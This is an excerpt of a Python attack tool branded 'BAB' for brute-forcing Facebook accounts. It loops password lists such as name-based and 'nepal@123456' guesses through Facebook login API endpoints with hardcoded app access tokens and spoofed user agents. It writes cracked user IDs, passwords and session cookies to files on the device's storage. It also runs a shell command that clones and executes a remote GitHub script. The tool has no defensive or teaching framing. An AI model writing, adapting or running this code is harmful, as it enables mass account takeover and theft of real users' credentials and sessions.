...
#print('[•] Join Whatapp Group')
os.system('xdg-open https://chat.whatsapp.com/GTf6GbYWFPp5rM6NF8qcZv')
...
if bit == '64bit':
 print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92m64BIT DETECTED IN YOUR DEVICE')
 
elif bit == '32bit':
 print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 32BIT USER')
# os.system("espeak -a 300 \" WELCOME TO BAB TOOL,\"")
...
def TWO():
	END = 'Mozilla/5.0 (Linux; Android 6.0.1: 10; Linux; Android 6.0.1;R3502L AppleWebKit/537.36 (KHTML, like Gecko)96 0 5739 129 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/259.0.0.36.115;]","Mozilla/5.0 (Linux; Android 6.0.1: 10; Linux; Android 6.0.1;F4129B AppleWebKit/537.36 (KHTML, like Gecko)101 0 6073 110 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/259.0.0.36.115;]","Mozilla/5.0 (Linux; Android 6.0.1: 10; Linux; Android 6.0.1;R4302V AppleWebKit/537.36 (KHTML, like Gecko)93 0 6038 75 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/259.0.0.36.115;]'
	ua = 'Mozilla/5.0 (Linux; Android 6.0.1: 9; Linux; Android 6.0.1;W9431J AppleWebKit/537.36 (KHTML, like Gecko)100 0 6333 110 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/259.0.0.36.115;]","Mozilla/5.0 (Linux; Android 6.0.1: 9; Linux; Android 6.0.1;G9301A AppleWebKit/537.36 (KHTML, like Gecko)84 0 5837 67 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/259.0.0.36.115;]","Mozilla/5.0 (Linux; Android 6.0.1: 9; Linux; Android 6.0.1;G3994S AppleWebKit/537.36 (KHTML, like Gecko)87 0 6689 104 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/259.0.0.36.115;] '+END
	return ua
...
logo=("""\033[1;36m
     ...
     ╚═════╝ ╚═╝  ╚═╝╚═════╝                      \033[92;1m                                                             
   ┏━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┓
   ┃𝐀𝐃𝐌𝐈𝐍 : BAB            ┃𝐒𝐓𝐀𝐓𝐔𝐒  : PREMIUM  ┃
   ┃𝐅𝐁 𝐈𝐃 : BAB            ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 3.0      ┃
   ┣━━━━━━━━━━━━━━━━━━━━━┳━┻━━━━━━━━━━━━━━━━━━━┫
   ┃𝐆𝐈𝐓𝐇𝐔𝐁 : BAB DON     ┃ 𝐓𝐎𝐎𝐋 : FILE<X>RANDOM|
   ┗━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━┛
    ———————————————————————————————————————————  """)
def linex():
    print(' ———————————————————————————————————————————— ')
               ...
               # alvino_xy("""YOU NEED TO PUT YOUR PASSWORD FOR SECURITY""")
                ...
                if x == ("***"):
                	   ...
                	   # print(" "+date)  
                        ...
                        linex()
                        BAB=input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOOSE : ')
                        ...
                        if BAB in ['1','01']:
                                ...
                                if ppp in ['1','01']:
                                        ...
                                        plist.append('nepal@123456')
                                        plist.append('nepal@1234567')
                                        plist.append('nepal@12345678')
                               ...
                               # else:
                                ...
                                public()        
                        if BAB in ['4','04']:os.system(' rm -rf FILE&&git clone --depth=1 https://github.com/Hannan-404/FILE&&cd FILE&&python FILE.py ')
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [BAB-M1] \x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m]|\033[1;37mOK:-\x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [BAB-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("Cookie: "+coki)
                                        open('/sdcard/BAB-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BAB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[BAB-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [BAB-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BAB-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/BAB-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [BAB-M2] \x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m]|\033[1;37mOK:-\x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [BAB-M3] \x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m]|\033[1;37mOK:-\x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def ffb(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [BAB-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"api_key": "882a8490361da98702bf97a021ddc14d",}
    ...
    # 'cookie': 'ps_l=0; ps_n=0; datr=GTcAZjkfmFb5bRXQYKuK2Cga; sb=GTcAZuCMvQSHHc86UwgyascX',
    'dpr': '2.75',
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/BABCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
...
def BAB1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [BAB-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [BAB-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BAB-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [BAB-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BAB-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                pass
#------------[ THIS RANDOM IS BULL SHIT  ]--------------#
def BAB2(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [BAB-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [BAB-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/BAB-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [BAB-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/BAB-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
		...
		print(e)
 #------------[ THIS RANDOM IS BULL SHIT  ]--------------#               
def BAB3(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [BAB-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/BAB-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BAB-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                ...
                pass
#------------[ THIS RANDOM IS BULL SHIT  ]--------------#
def BAB4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [BAB-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/BAB-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/BAB-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                ...
                pass
#------------[ THIS RANDOM IS BULL SHIT  ]--------------#
def BAB5(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [BAB-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                ...
                pass
#------------[ THIS RANDOM IS BULL SHIT  ]--------------#
def BAB6(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [BAB-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [BAB-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [BAB-OK] '+uid+' | '+pas)
						open('/sdcard/BAB-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m BAB-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/BAB-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
...
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r\033[1;37m[BAB-M1]\033[1;37m %s {B}|{G}\033[1;37m OK{B}|{G}\033[1;37mCP{G}\033[1;37m %s{B}|{G}\033[1;37m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}\033[1;32mBAB-OK{B}❳{G}\033[1;32m '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print(f"\r\r{B}❲{G}\033[1;37mCOOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/BAB-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}BAB-CP{B}❳{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BAB-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
...
def rndm2(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}BAB-M2{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}BAB-OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
...
def rndm3(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}BAB-M3{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
